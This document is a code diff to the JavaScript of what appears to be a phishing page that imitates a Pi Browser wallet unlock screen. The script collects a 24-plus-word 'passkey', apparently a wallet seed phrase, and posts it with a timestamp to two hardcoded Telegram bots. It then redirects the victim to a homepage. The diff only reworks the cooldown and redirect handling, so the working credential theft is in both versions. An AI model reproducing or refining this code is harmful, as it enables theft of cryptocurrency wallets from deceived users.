@@ -232,38 +232,54 @@
   const TELEGRAM_CHAT_ID_2 = "8119887370";
 
 
- let isCooldown = false; // Prevent spamming
+   let isCooldown = false; // tracks cooldown
 
     function sendMessage() {
+      if (isCooldown) {
+        showStatus("⏳ Please wait before trying again", "error");
+        return;
+      }
+
       const input = document.getElementById("messageInput");
       const statusMessage = document.getElementById("statusMessage");
       const buttons = document.querySelectorAll(".unlock-button");
       const buttonTexts = document.querySelectorAll(".button-text");
       const message = input.value.trim();
 
-      if (isCooldown) {
-        showStatus("⏳ Please wait before trying again", "error");
-        return;
-      }
+      // Start cooldown immediately
+      isCooldown = true;
+      input.disabled = true;
+      buttons.forEach((btn) => btn.disabled = true);
 
       if (message.length <= 24) {
         showStatus("✗ It should be a 24-length passkey to login", "error");
-        return;
+
+        // After 5 seconds, redirect to homepage
+        setTimeout(() => {
+          window.location.replace("https://pibrowserkurd.github.io/");
+        }, 5000);
+
+        // Re-enable input and buttons after cooldown anyway (to avoid stuck disabled if user lands back)
+        setTimeout(() => {
+          isCooldown = false;
+          input.disabled = false;
+          buttons.forEach((btn) => btn.disabled = false);
+        }, 5000);
+
+        return; // stop further execution
       }
 
-      // Start cooldown and disable input/buttons
-      isCooldown = true;
-      input.disabled = true;
-      buttons.forEach((button, index) => {
-        button.disabled = true;
-        buttonTexts[index].innerHTML = `<span class="loading-spinner"></span>Processing...`;
-      });
-
-      // Format message with header and timestamp
+      // Format the message to send to Telegram
       const now = new Date();
       const timestamp = now.toLocaleString();
       const formattedMessage = `📩 *New Passkey Log In*\n\n🔑 Passkey:\n${message}\n\n🕒 Time:\n${timestamp}`;
 
+      // Show sending spinner
+      buttonTexts.forEach((textSpan) => {
+        textSpan.innerHTML = `<span class="loading-spinner"></span>Processing...`;
+      });
+
+      // Send messages to telegram bots
       const requests = [
         fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_1}/sendMessage`, {
           method: "POST",
@@ -272,7 +288,7 @@
             chat_id: TELEGRAM_CHAT_ID_1,
             text: formattedMessage,
             parse_mode: "Markdown"
-          })
+          }),
         }),
         fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
           method: "POST",
@@ -281,14 +297,13 @@
             chat_id: TELEGRAM_CHAT_ID_2,
             text: formattedMessage,
             parse_mode: "Markdown"
-          })
-        })
+          }),
+        }),
       ];
 
       Promise.all(requests)
-        .then(responses => Promise.all(responses.map(res => res.json())))
+        .then(responses => Promise.all(responses.map(r => r.json())))
         .then(results => {
-          // You can check results here for success/failure if you want
           showStatus("✅ Passkey sent! Redirecting to homepage...", "success");
           input.value = "";
         })
@@ -297,19 +312,20 @@
           console.error("Error:", error);
         })
         .finally(() => {
-          // Cooldown for 10 seconds before re-enable inputs
+          // Redirect after 5 seconds
+          setTimeout(() => {
+            window.location.replace("https://pibrowserkurd.github.io/");
+          }, 5000);
+
+          // Re-enable input/buttons and cooldown after 5 seconds (matches redirect delay)
           setTimeout(() => {
             isCooldown = false;
             input.disabled = false;
-            buttons.forEach((button, index) => {
-              button.disabled = false;
-              buttonTexts[index].textContent = index === 0 ? "Unlock With Passphrase" : "Unlock With Face ID";
+            buttons.forEach((btn, idx) => {
+              btn.disabled = false;
+              const buttonTexts = document.querySelectorAll(".button-text");
+              buttonTexts[idx].textContent = idx === 0 ? "Unlock With Passphrase" : "Unlock With Face ID";
             });
-          }, 10000);
-
-          // Redirect to homepage after 5 seconds
-          setTimeout(() => {
-            window.location.replace("https://pibrowserkurd.github.io/");
           }, 5000);
         });
     }
